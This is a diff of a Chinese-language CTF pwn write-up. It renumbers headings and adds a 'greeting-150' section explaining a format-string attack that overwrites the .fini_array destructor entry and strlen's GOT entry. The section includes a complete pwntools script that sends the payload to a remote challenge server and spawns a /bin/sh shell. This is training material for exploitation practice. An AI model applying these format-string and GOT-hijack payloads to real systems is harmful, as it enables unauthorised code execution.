@@ -1034,7 +1034,7 @@ data = sh.recvuntil('\n')
 sh.interactive()
 ```
 
-### stack2
+### 15. stack2
 题目：暂无
 
 思路：漏洞点在于数组越界，导致可以写任意地址。
@@ -1081,7 +1081,7 @@ print(data)
 sh.interactive()
 ```
 
-### Recho
+### 16. Recho
 题目：暂无
 
 思路：看起来是一个很简单的栈溢出，但是难点在于如何使得main函数返回，从而劫持控制流。这里使用了pwntools提供的shutdown功能，可以关闭输入流，但是由于无法继续输入了，因此必须通过rop一次获取flag，而不能继续进入main函数输入其他信息了。
@@ -1180,5 +1180,83 @@ print(payload)
 sh.sendline(str(0x200))
 sh.send(payload.ljust(0x200, b'\x00'))
 sh.shutdown('write')
+sh.interactive()
+```
+
+### 17. greeting-150
+题目：暂无
+
+思路：格式化字符串漏洞，可以修改got表，这里的关键在于修改_do_global_dtors_aux函数的got表，使得main函数结束后可以劫持流程。
+
+#### __do_global_dtors_aux和__do_global_ctors_aux
+静态对象的构造函数和析构函数的地址分别存储在 ELF可执行文件的不同部分中。对于构造函数，有一个名为 .CTORS 的部分，对于析构函数，有 .DTORS 部分。编译器创建两个辅助函数 __ do_global_ctors_aux 和 __ do_global_dtors_aux ，分别用于调用这些静态对象的构造函数和析构函数。__ do_global_ctors_aux 功能只是在 .CTORS 部分执行，而 __ do_global_dtors_aux 仅针对执行相同的工作。 DTORS 部分，其中包含指定析构函数的程序。
+
+#### 修改got
+修改__do_global_dtors_aux的got内容为main函数地址使得main函数结束后还可以再次重入到main函数，然后修改strlen函数的got表内容为system函数地址，然后调用strlen("/bin/sh")时就获取了shell。
+```python
+.fini_array:08049934 __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux
+.fini_array:08049934                                         ; DATA XREF: __libc_csu_init+18↑o
+.fini_array:08049934 _fini_array     ends                    ; Alternative name is '__init_array_end'
+# 0x08049934的内容从080485A0 __do_global_dtors_aux proc near修改为080485ED ; int __cdecl main
+# 可以看到只用修改一个字节即可
+```
+
+修改strlen的got地址内容为system地址，system地址不便于获取，可以用system的plt地址代替。
+
+全部利用代码如下：
+```python
+from pwn import *
+
+sh = remote('220.249.52.133', 55994)
+data = sh.recvuntil('... ')
+print(data)
+
+# 借助ida可以分析调用printf堆栈情况
+# 0xA0 --> s
+# ...
+# 0x84 --> 'Nice'
+# 0x80 --> ' to '
+# 0x7c --> 'meet'
+# 0x78 --> ' you'
+# 0x74 --> ', '
+# 首先添加两个字符使栈内容按照4字节对齐
+payload = b'AA'
+# 修改dtor got地址，需要写入的地址, 第12个参数
+# 修改前后只有最后一个字节不同，因此只用写入一个字节
+payload += p32(0x08049934)
+# 由于之前已经输出了24个字符，还需要输出0xed-24个字符
+payload += b'%213'
+payload += b'c%12'
+payload += b'$hhn'
+# 没有system函数的地址，但是可以使用plt的地址
+strlenGot = 0x08049A54
+# systemPlt = 0x08048490
+# 分两次写入
+# 修改strlen got地址, 先写高地址，第16个参数
+payload += p32(strlenGot + 2)
+payload += b'%181'
+payload += b'1c%1'
+payload += b'6$hn'
+# 写低地址, 第20个参数
+payload += p32(strlenGot)
+payload += b'%318'
+payload += b'80c%'
+payload += b'20$h'
+payload += b'n'
+print(payload)
+print(len(payload))
+
+# 上面生成payload的方式计算比较复杂
+# 可以将地址写在前面，方便计算
+# 按照数字从小到大的顺序写入
+payload = b'AA'
+payload += flat([0x08049934, strlenGot + 2, strlenGot])
+chars = [0xed - 32, 0x804 - 0xed, 0x8490 - 0x804]
+payload += ('%' + str(chars[0]) + 'c%12$hhn%' + str(chars[1]) + 'c%13$hn%' + str(chars[2]) + 'c%14$hn').encode('utf8')
+print(payload)
+sh.sendline(payload)
+
+data = sh.recvuntil('... ')
+sh.sendline('/bin/sh')
 sh.interactive()
 ```
